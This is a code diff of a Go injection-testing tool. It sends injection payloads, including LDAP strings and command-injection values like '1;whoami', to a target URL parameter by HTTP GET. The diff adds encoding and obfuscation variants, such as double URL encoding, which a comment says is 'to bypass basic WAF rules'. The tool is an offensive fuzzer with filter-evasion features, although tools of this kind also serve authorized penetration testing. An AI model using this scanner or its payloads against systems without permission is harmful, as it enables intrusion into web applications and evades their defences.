@@ -7,17 +7,23 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"strings"
 	"time"
 )
 
 func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: injection-tester <target_url> <parameter>")
-		fmt.Println("Example: injection-tester http://example.com/page=parameter")
+	if len(os.Args) < 2 {
+		fmt.Println("Usage: injection-tester <target_url>")
+		fmt.Println("Example: injection-tester http://target.com/test=")
 		os.Exit(1)
 	}
 	targetURL := os.Args[1]
-	param := os.Args[2]
+
+	// Ensure that the target URL contains an "=" sign
+	if !strings.Contains(targetURL, "=") {
+		fmt.Println("Error: Target URL must contain an '=' sign")
+		os.Exit(1)
+	}
 
 	// Injection payloads covering multiple attack types
 	payloads := []string{
@@ -40,7 +46,7 @@ func main() {
 
 		// LDAP Injection
 		"*",
-		"*) (|(uid=*))(|(uid=*",
+		"*) (|(uid=*))(|(uid=*", 
 
 		// Command Injection
 		"1;whoami",
@@ -82,14 +88,17 @@ func main() {
 
 	// Iterate over each payload and apply different encoding techniques
 	for _, payload := range payloads {
+		// Get basic encodings.
 		encodedVariants := generateEncodings(payload)
+		// Merge advanced encodings into the same map.
+		advEncodings := generateAdvancedEncodings(payload)
+		for k, v := range advEncodings {
+			encodedVariants[k] = v
+		}
+
 		for encType, encodedPayload := range encodedVariants {
 			fmt.Printf("Testing [%s] encoding for payload: %s\n", encType, payload)
-			fullURL, err := buildURL(targetURL, param, encodedPayload)
-			if err != nil {
-				fmt.Printf("Error constructing URL: %v\n", err)
-				continue
-			}
+			fullURL := buildURL(targetURL, encodedPayload)
 			testPayload(fullURL)
 			// Short delay between requests to avoid overwhelming the target server.
 			time.Sleep(500 * time.Millisecond)
@@ -97,9 +106,21 @@ func main() {
 	}
 }
 
+// generateEncodings returns a map of basic encoding variants for a payload.
+func generateEncodings(payload string) map[string]string {
+	variants := make(map[string]string)
+	variants["raw"] = payload
+	variants["url"] = url.QueryEscape(payload)
+	// Double URL encoding to bypass basic WAF rules.
+	variants["double_url"] = url.QueryEscape(variants["url"])
+	// Base64 encoding.
+	variants["base64"] = base64.StdEncoding.EncodeToString([]byte(payload))
+	return variants
+}
+
 // generateAdvancedEncodings returns a map with advanced encoding/obfuscation variants.
 func generateAdvancedEncodings(payload string) map[string]string {
-	variants := generateEncodings(payload) // existing raw, url, double_url, base64
+	variants := generateEncodings(payload) // start with basic encodings
 
 	// Add hex encoding variant
 	variants["hex"] = hexEncode(payload)
@@ -117,7 +138,7 @@ func generateAdvancedEncodings(payload string) map[string]string {
 	return variants
 }
 
-// hexEncode converts the payload to a hex string (e.g., "\x27\x20...")
+// hexEncode converts the payload to a hex string (e.g., "%x27%x20...")
 func hexEncode(payload string) string {
 	hexStr := ""
 	for _, c := range payload {
@@ -135,7 +156,7 @@ func unicodeEncode(payload string) string {
 	return unicodeStr
 }
 
-// obfuscatePayload randomizes case and inserts inline comments
+// obfuscatePayload randomizes case and inserts inline comments.
 func obfuscatePayload(payload string) string {
 	// Simple example: insert a comment after every 3 characters.
 	obfuscated := ""
@@ -148,17 +169,14 @@ func obfuscatePayload(payload string) string {
 	return obfuscated
 }
 
-
-// buildURL appends the encoded payload to the specified parameter in the target URL.
-func buildURL(baseURL, param, payload string) (string, error) {
-	u, err := url.Parse(baseURL)
-	if err != nil {
-		return "", err
+// buildURL replaces the content after the first "=" in the target URL with the encoded payload.
+func buildURL(targetURL, payload string) string {
+	idx := strings.Index(targetURL, "=")
+	if idx == -1 {
+		// This should never happen because we check earlier.
+		return targetURL
 	}
-	q := u.Query()
-	q.Set(param, payload)
-	u.RawQuery = q.Encode()
-	return u.String(), nil
+	return targetURL[:idx+1] + payload
 }
 
 // testPayload sends an HTTP GET request to the full URL and prints status and response length.
